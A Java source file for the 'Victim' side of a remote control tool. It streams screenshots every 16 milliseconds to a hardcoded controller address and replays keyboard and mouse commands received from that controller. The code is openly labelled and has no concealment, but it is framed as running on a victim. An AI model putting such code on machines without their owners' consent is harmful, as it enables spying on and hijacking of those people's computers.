package BackEnd;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.FlavorEvent;
import java.awt.datatransfer.FlavorListener;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.*;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static java.lang.Thread.sleep;

/**
 * This class will be run on the victim's end.
 * @author Deekyech
 */
public class Victim {

    /**
     * ******************************************************************
     *                            CONSTRUCTOR
     * ******************************************************************
     */
    /**
     * It will initialize all sockets and threads that will be used by the victim.
     * @param address : InetAddress of the victim.
     * @throws IOException : In case any IOException is generated.
     */
    public Victim(InetAddress address) throws IOException {
        this.address = address;
        try {
            victimSocket = new DatagramSocket();
            robot = new Robot();
            eventsServerSocket = new ServerSocket(ScreenSharingConstants.EVENTS_PORT);
            eventsSocket = eventsServerSocket.accept();
            clipboardServerSocket = new ServerSocket(ScreenSharingConstants.CLIPBOARD_PORT);
            clipboardSocket = clipboardServerSocket.accept();
            systemClipboard = Toolkit.getDefaultToolkit().getSystemClipboard();

        } catch(Exception e) {
            e.printStackTrace();
        }

        /**
         * The following code will encode the current victim's screen size dimensions
         * and will send it to the controller.
         * The dimensions will be used for scaling for all mouseEvents.
         */
        Pattern pattern = Pattern.compile("\\[(.*?)\\]");
        Matcher matcher = pattern.matcher(Toolkit.getDefaultToolkit().getScreenSize().toString());
        if (matcher.find())
            eventsSocket.getOutputStream().write((matcher.group(1) + "\n").getBytes());


        /*
        * This thread will be invoked every 16 milliseconds and send a screenshot
        * to the controller.
        * */
        new Thread(() -> {
            while(true) {
                try {
                    sendScreenShot();
                    sleep(16);
                } catch(Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();

        /*
        * The following thread will be receive all the events generated by the
        * controller and will perform them on victim machine.
        * */
        new Thread(() -> receiveEvents()).start();
    }



    /*
    * ReceiveEvents():
    * This method will receive an event packet, convert into a string
    * and will call the performEvent method.
    * */
    private void receiveEvents() {
        try {
            while(true) {
                performEvent(new Scanner(eventsSocket.getInputStream()).nextLine());
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * This method will decode and execute the string command on the
     * victim machine.
     * @param command : The event command in encoded form.
     */
    private void performEvent(String command) {
        Scanner scanner = new Scanner(command);
        switch(scanner.next()) {
            case ScreenSharingConstants.KEY_PRESSED_COMMAND:
                robot.keyPress(Integer.parseInt(scanner.next()));
                break;
            case ScreenSharingConstants.KEY_RELEASED_COMMAND:
                robot.keyRelease(Integer.parseInt(scanner.next()));
                break;
            case ScreenSharingConstants.MOUSE_MOVE_COMMAND:
                robot.mouseMove(Integer.parseInt(scanner.next()), Integer.parseInt(scanner.next()));
                break;
            case ScreenSharingConstants.MOUSE_PRESSED_COMMAND:
                robot.mousePress(Integer.parseInt(scanner.next()));
                break;
            case ScreenSharingConstants.MOUSE_RELEASED_COMMAND:
                robot.mouseRelease(Integer.parseInt(scanner.next()));
                break;
            case ScreenSharingConstants.MOUSE_WHEEL_COMMAND:
                robot.mouseWheel(Integer.parseInt(scanner.next()));
                break;
        }
    }

    /*
    * sendScreenShot():
    * This method will be called by the timer in a time interval of every 16
    * milliseconds.
    * It will capture a snapshot, convert it into bytes, distribute these
    * bytes into packets of 1024 bytes and send it to the controller.
    *
    * */
    private void sendScreenShot() {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(getImageFromSource(), "jpg", baos);
            byte[] screenInBytes = baos.toByteArray();
            String s = "" + screenInBytes.length;
            DatagramPacket datagramPacket = new DatagramPacket(s.getBytes(), s.getBytes().length, this.address, ScreenSharingConstants.SCREEN_SHARING_PORT);
            victimSocket.send(datagramPacket);
            int packetCount = 0;
            int byteCounter = 0;
            boolean condition = true;
            while(condition) {
                byte[] buffer = new byte[1024];
                int i = 0;
                //buffer[0] = ++packetCount;
                while(byteCounter<screenInBytes.length && i<1024) {
                    buffer[i] = screenInBytes[byteCounter];
                    byteCounter++;
                    i++;
                }
                DatagramPacket packetToBeSent = new DatagramPacket(buffer, buffer.length, this.address, ScreenSharingConstants.SCREEN_SHARING_PORT);
                victimSocket.send(packetToBeSent);
                System.out.println("Packet sending: " + ++packetCount + "\nSize of packet: " + buffer.length);
                if (byteCounter == screenInBytes.length) {
                    condition = false;
                }
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * This method will capture a screenshot and return it to the sendScreenShot method.
     * @return BufferedImage of the image to be sent.
     */
    private BufferedImage getImageFromSource() {
        return robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
    }

    //Getters and Setters
    public InetAddress getAddress() {
        return this.address;
    }
    public void setAddress(InetAddress address) {
        this.address = address;
    }
    public static void main(String[] args) throws Exception{
        new Victim(InetAddress.getByName("192.168.0.125"));
    }

    //Variable Declarations
    private InetAddress address;
    private Robot robot;
    private DatagramSocket victimSocket;
    private Socket eventsSocket = null;
    private Socket clipboardSocket = null;
    private ServerSocket eventsServerSocket;
    private ServerSocket clipboardServerSocket;
    private Clipboard systemClipboard;
    private DataFlavor prevDataFlavor;
}